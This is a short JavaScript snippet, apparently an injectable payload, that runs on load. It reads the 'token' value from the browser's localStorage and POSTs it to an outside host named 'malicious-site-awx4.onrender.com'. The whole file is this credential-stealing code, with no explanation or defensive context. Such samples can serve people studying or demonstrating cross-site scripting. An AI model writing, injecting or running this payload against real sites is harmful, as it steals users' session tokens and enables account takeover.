function trigger() {
  const userToken = localStorage.getItem("token");

  fetch("https://malicious-site-awx4.onrender.com/user-token", {
    method: "POST",
    headers: {
      "Content-Type": "application/json;charset=UTF-8",
    },
    body: JSON.stringify({
      userToken,
    }),
  });
}

trigger();
